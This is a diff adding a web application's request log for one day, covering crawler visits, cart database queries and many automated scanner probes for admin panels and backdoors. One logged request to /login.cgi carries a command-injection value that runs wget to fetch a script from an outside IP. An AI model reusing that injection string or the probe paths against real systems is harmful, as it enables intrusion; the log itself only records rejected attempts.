@@ -1,0 +1,224 @@
+[ 2018-09-04T00:05:52+08:00 ] 203.208.60.65 /robots.txt
+ERR: 无法加载控制器:Robots.txt
+
+[ 2018-09-04T00:46:11+08:00 ] 203.208.60.90 /Cart/ajaxFcuntion.html
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000257s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000463s ]
+SQL: SHOW COLUMNS FROM `plgox_specifications` [ RunTime:0.0006s ]
+SQL: SELECT * FROM plgox_specifications as sp left join plgox_zulin as zulin on zulin.zulin_id = sp.specifications_day_number_id  WHERE `specifications_id` = '24'  [ RunTime:0.0004s ]
+
+[ 2018-09-04T06:48:43+08:00 ] 194.247.173.123 /robots.txt
+ERR: 无法加载控制器:Robots.txt
+
+[ 2018-09-04T06:48:45+08:00 ] 194.247.173.123 /Xianzhi/%E5%B0%B1%E7%9C%8B%E8%A7%81
+ERR: 无法加载控制器:Xianzhi
+
+[ 2018-09-04T06:48:47+08:00 ] 194.247.173.123 /index/%E5%B0%B1%E7%9C%8B%E8%A7%81
+ERR: 非法操作:就看见
+
+[ 2018-09-04T07:00:13+08:00 ] 141.8.142.170 /robots.txt
+ERR: 无法加载控制器:Robots.txt
+
+[ 2018-09-04T07:00:18+08:00 ] 213.180.203.57 /robots.txt
+ERR: 无法加载控制器:Robots.txt
+
+[ 2018-09-04T07:10:14+08:00 ] 220.181.125.177 /robots.txt
+ERR: 无法加载控制器:Robots.txt
+
+[ 2018-09-04T07:33:12+08:00 ] 203.208.60.17 /Cart/ajaxFcuntion.html
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000255s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000461s ]
+SQL: SHOW COLUMNS FROM `plgox_specifications` [ RunTime:0.0005s ]
+SQL: SELECT * FROM plgox_specifications as sp left join plgox_zulin as zulin on zulin.zulin_id = sp.specifications_day_number_id  WHERE `specifications_id` = '52'  [ RunTime:0.0005s ]
+
+[ 2018-09-04T07:53:07+08:00 ] 66.249.79.233 /Cart/ajaxFcuntion.html
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000229s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000398s ]
+SQL: SHOW COLUMNS FROM `plgox_specifications` [ RunTime:0.0005s ]
+SQL: SELECT * FROM plgox_specifications as sp left join plgox_zulin as zulin on zulin.zulin_id = sp.specifications_day_number_id  WHERE `specifications_id` = '42'  [ RunTime:0.0003s ]
+
+[ 2018-09-04T08:53:23+08:00 ] 203.208.60.104 /Cart/ajaxFcuntion.html
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000241s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000462s ]
+SQL: SHOW COLUMNS FROM `plgox_specifications` [ RunTime:0.0006s ]
+SQL: SELECT * FROM plgox_specifications as sp left join plgox_zulin as zulin on zulin.zulin_id = sp.specifications_day_number_id  WHERE `specifications_id` = '17'  [ RunTime:0.0003s ]
+
+[ 2018-09-04T09:06:15+08:00 ] 203.208.60.29 /Cart/ajaxFcuntion.html
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000358s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000593s ]
+SQL: SHOW COLUMNS FROM `plgox_specifications` [ RunTime:0.0005s ]
+SQL: SELECT * FROM plgox_specifications as sp left join plgox_zulin as zulin on zulin.zulin_id = sp.specifications_day_number_id  WHERE `specifications_id` = '108'  [ RunTime:0.0003s ]
+
+[ 2018-09-04T09:13:14+08:00 ] 220.181.124.98 /robots.txt
+ERR: 无法加载控制器:Robots.txt
+
+[ 2018-09-04T09:16:33+08:00 ] 104.168.7.39 /robots.txt
+ERR: 无法加载控制器:Robots.txt
+
+[ 2018-09-04T09:16:34+08:00 ] 104.168.7.39 /blog/robots.txt
+ERR: 无法加载控制器:Blog
+
+[ 2018-09-04T09:16:35+08:00 ] 104.168.7.39 /blog/
+ERR: 无法加载控制器:Blog
+
+[ 2018-09-04T09:16:35+08:00 ] 104.168.7.39 /wordpress/
+ERR: 无法加载控制器:Wordpress
+
+[ 2018-09-04T09:16:35+08:00 ] 104.168.7.39 /wp/
+ERR: 无法加载控制器:Wp
+
+[ 2018-09-04T10:14:51+08:00 ] 203.208.60.90 /robots.txt
+ERR: 无法加载控制器:Robots.txt
+
+[ 2018-09-04T10:15:11+08:00 ] 203.208.60.23 /Cart/ajaxFcuntion.html
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000238s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000419s ]
+SQL: SHOW COLUMNS FROM `plgox_specifications` [ RunTime:0.0005s ]
+SQL: SELECT * FROM plgox_specifications as sp left join plgox_zulin as zulin on zulin.zulin_id = sp.specifications_day_number_id  WHERE `specifications_id` = '18'  [ RunTime:0.0003s ]
+
+[ 2018-09-04T10:23:28+08:00 ] 203.208.60.4 /Cart/ajaxFcuntion.html
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000305s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000503s ]
+SQL: SHOW COLUMNS FROM `plgox_specifications` [ RunTime:0.0005s ]
+SQL: SELECT * FROM plgox_specifications as sp left join plgox_zulin as zulin on zulin.zulin_id = sp.specifications_day_number_id  WHERE `specifications_id` = '17'  [ RunTime:0.0003s ]
+
+[ 2018-09-04T10:35:25+08:00 ] 123.126.114.194 /Index/weizhi.html
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000245s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000425s ]
+
+[ 2018-09-04T12:13:03+08:00 ] 117.184.250.101 /skins/vector/csshover.htc
+ERR: 无法加载控制器:Skins
+
+[ 2018-09-04T12:13:06+08:00 ] 117.184.250.101 /rockmongo/
+ERR: 无法加载控制器:Rockmongo
+
+[ 2018-09-04T12:13:06+08:00 ] 117.184.250.101 /server-status
+ERR: 无法加载控制器:Server-status
+
+[ 2018-09-04T12:13:06+08:00 ] 117.184.250.101 /wikilib.d/PmWiki.ChangeLog
+ERR: 无法加载控制器:Wikilib.d
+
+[ 2018-09-04T12:13:06+08:00 ] 117.184.250.101 /jenkins/
+ERR: 无法加载控制器:Jenkins
+
+[ 2018-09-04T12:13:06+08:00 ] 117.184.250.101 /console/login/LoginForm.jsp
+ERR: 无法加载控制器:Console
+
+[ 2018-09-04T12:13:06+08:00 ] 117.184.250.101 /solr/
+ERR: 无法加载控制器:Solr
+
+[ 2018-09-04T15:44:11+08:00 ] 47.99.99.195 /explicit_not_exist_path
+ERR: 无法加载控制器:Explicit_not_exist_path
+
+[ 2018-09-04T15:44:14+08:00 ] 47.99.99.195 /index.jsp
+ERR: 无法加载控制器:Index.jsp
+
+[ 2018-09-04T15:44:15+08:00 ] 47.99.99.195 /robots.txt
+ERR: 无法加载控制器:Robots.txt
+
+[ 2018-09-04T15:44:15+08:00 ] 47.99.99.195 /js/kindeditor/Makefile
+ERR: 无法加载控制器:Js
+
+[ 2018-09-04T15:44:16+08:00 ] 47.99.99.195 /theme/zui/fonts/zenicon.eot
+ERR: 无法加载控制器:Theme
+
+[ 2018-09-04T15:44:16+08:00 ] 47.99.99.195 /README
+ERR: 无法加载控制器:README
+
+[ 2018-09-04T15:44:16+08:00 ] 47.99.99.195 /solr/
+ERR: 无法加载控制器:Solr
+
+[ 2018-09-04T15:44:16+08:00 ] 47.99.99.195 /wcm/
+ERR: 无法加载控制器:Wcm
+
+[ 2018-09-04T15:44:16+08:00 ] 47.99.99.195 /phpMyAdmin/
+ERR: 无法加载控制器:PhpMyAdmin
+
+[ 2018-09-04T15:44:16+08:00 ] 47.99.99.195 /phpmyadmin/
+ERR: 无法加载控制器:Phpmyadmin
+
+[ 2018-09-04T15:44:16+08:00 ] 47.99.99.195 /pma/
+ERR: 无法加载控制器:Pma
+
+[ 2018-09-04T15:45:15+08:00 ] 47.97.198.112 /explicit_not_exist_path
+ERR: 无法加载控制器:Explicit_not_exist_path
+
+[ 2018-09-04T15:45:16+08:00 ] 47.97.198.112 /index.jsp
+ERR: 无法加载控制器:Index.jsp
+
+[ 2018-09-04T15:45:17+08:00 ] 47.97.198.112 /robots.txt
+ERR: 无法加载控制器:Robots.txt
+
+[ 2018-09-04T15:45:17+08:00 ] 47.97.198.112 /js/kindeditor/Makefile
+ERR: 无法加载控制器:Js
+
+[ 2018-09-04T15:45:17+08:00 ] 47.97.198.112 /theme/zui/fonts/zenicon.eot
+ERR: 无法加载控制器:Theme
+
+[ 2018-09-04T15:45:18+08:00 ] 47.97.198.112 /README
+ERR: 无法加载控制器:README
+
+[ 2018-09-04T15:45:18+08:00 ] 47.97.198.112 /solr/
+ERR: 无法加载控制器:Solr
+
+[ 2018-09-04T15:45:18+08:00 ] 47.97.198.112 /wcm/
+ERR: 无法加载控制器:Wcm
+
+[ 2018-09-04T15:45:18+08:00 ] 47.97.198.112 /phpMyAdmin/
+ERR: 无法加载控制器:PhpMyAdmin
+
+[ 2018-09-04T15:45:18+08:00 ] 47.97.198.112 /phpmyadmin/
+ERR: 无法加载控制器:Phpmyadmin
+
+[ 2018-09-04T15:45:18+08:00 ] 47.97.198.112 /pma/
+ERR: 无法加载控制器:Pma
+
+[ 2018-09-04T16:13:13+08:00 ] 106.38.241.142 /robots.txt
+ERR: 无法加载控制器:Robots.txt
+
+[ 2018-09-04T16:44:34+08:00 ] 101.226.114.195 /jenkins
+ERR: 无法加载控制器:Jenkins
+
+[ 2018-09-04T17:29:23+08:00 ] 120.131.5.232 /data/%236Ik1Qv.asa
+ERR: 无法加载控制器:Data
+
+[ 2018-09-04T17:29:23+08:00 ] 120.131.5.232 /data/%23data.asp
+ERR: 无法加载控制器:Data
+
+[ 2018-09-04T17:29:23+08:00 ] 120.131.5.232 /data/%23aspcms252.asp
+ERR: 无法加载控制器:Data
+
+[ 2018-09-04T17:29:23+08:00 ] 120.131.5.232 /data/%235Dp8Gh.asp
+ERR: 无法加载控制器:Data
+
+[ 2018-09-04T17:29:23+08:00 ] 120.131.5.232 /phpmyadmin/
+ERR: 无法加载控制器:Phpmyadmin
+
+[ 2018-09-04T18:43:20+08:00 ] 191.100.11.179 /login.cgi?cli=aa%20aa%27;wget%20http://128.199.251.119/t.php%27$
+ERR: 无法加载控制器:Login.cgi
+
+[ 2018-09-04T21:14:03+08:00 ] 107.170.209.251 /graphs/
+ERR: 无法加载控制器:Graphs
+
+[ 2018-09-04T21:51:49+08:00 ] 120.92.72.220 /Zulin/share_list?order1=1
+ERR: 非法操作:share_list
+
+[ 2018-09-04T21:51:49+08:00 ] 120.92.72.88 /Zulin/share_list?order2=2
+ERR: 非法操作:share_list
+
+[ 2018-09-04T23:31:12+08:00 ] 47.106.123.15 /Index/weizhi.html
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000347s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000583s ]
+
+[ 2018-09-04T23:39:57+08:00 ] 71.6.202.198 /ccvv
+ERR: 无法加载控制器:Ccvv
+
